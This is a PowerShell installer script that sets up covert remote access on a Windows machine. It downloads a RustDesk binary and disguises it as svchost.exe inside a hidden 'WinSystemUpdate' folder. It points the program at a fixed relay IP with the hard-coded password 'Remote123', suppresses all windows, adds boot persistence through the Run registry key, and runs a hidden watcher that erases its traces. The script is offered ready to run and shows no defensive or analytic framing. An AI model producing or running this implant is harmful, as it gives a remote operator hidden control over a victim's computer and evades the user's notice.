function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST       = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE        = "$DEST\svchost.exe"
    $DLL        = "$DEST\sciter.dll"
    $CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
    $SCITER_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"
    $cfgDir     = "$env:APPDATA\RustDesk\config"

    # 1. Kill old + clean
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST   -Force | Out-Null
    New-Item -ItemType Directory $cfgDir -Force | Out-Null

    # 2. Download in parallel (fast)
    Write-Host "Installing..." -ForegroundColor Cyan
    $wc1 = New-Object System.Net.WebClient
    $wc2 = New-Object System.Net.WebClient
    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue
    Register-ObjectEvent $wc1 DownloadFileCompleted -SourceIdentifier "RDCHR" | Out-Null
    Register-ObjectEvent $wc2 DownloadFileCompleted -SourceIdentifier "RDSCT" | Out-Null
    $wc1.DownloadFileAsync([uri]$CHROME_URL, $EXE)
    $wc2.DownloadFileAsync([uri]$SCITER_URL, $DLL)
    $null = Wait-Event -SourceIdentifier "RDCHR" -Timeout 120
    $null = Wait-Event -SourceIdentifier "RDSCT" -Timeout 120
    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; return
    }

    # 3. Config - password + click both work, closing popup keeps connection alive
    @'
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password-click'
allow-only-conn-window-open = 'N'
direct-server = 'N'
force-always-relay = 'Y'
allow-remote-config-modification = 'N'
'@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

    @'
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
'@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

    # 4. Hide folder
    try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 2 -bor 4 } catch {}

    # 5. Get ID first (silent, no window)
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName=$EXE; $psiId.Arguments='--get-id'
    $psiId.UseShellExecute=$false; $psiId.RedirectStandardOutput=$true
    $psiId.CreateNoWindow=$true; $psiId.WorkingDirectory=$DEST
    $prId = [System.Diagnostics.Process]::Start($psiId)
    $outT = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    $RDID = $outT.Result.Trim()

    # 6. Now start RustDesk as background service - hidden, no UI
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
    $psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute=$false
    $psi.CreateNoWindow=$true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 2

    # 7. Force hide any window that slipped through
    Add-Type -Name W2 -Namespace N2 -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N2.W2]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }

    # 8. Auto-start on boot via registry (no admin needed)
    $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force

    # 8. Delete script
    $del = "$DEST\delete.ps1"
    Set-Content $del @'
$d = "$env:LOCALAPPDATA\WinSystemUpdate"
Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
'@ -Encoding UTF8

    # 9. Watcher - auto deletes when process stops OR after 1 hour
    $watch = "$DEST\watch.ps1"
    Set-Content $watch @'
$EXE      = "$env:LOCALAPPDATA\WinSystemUpdate\svchost.exe"
$del      = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
$deadline = [DateTime]::Now.AddHours(1)
while ([DateTime]::Now -lt $deadline) {
    Start-Sleep 10
    $alive = Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
    if (-not $alive) { break }
}
if (Test-Path $del) { & $del }
'@ -Encoding UTF8

    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""

    # 10. Print ID and password
    Write-Host ""
    Write-Host "  ============================" -ForegroundColor Green
    Write-Host "  ID       : $RDID"             -ForegroundColor Cyan
    Write-Host "  Password : Remote123"          -ForegroundColor Cyan
    Write-Host "  ============================" -ForegroundColor Green
    Write-Host ""
}
Install-RD
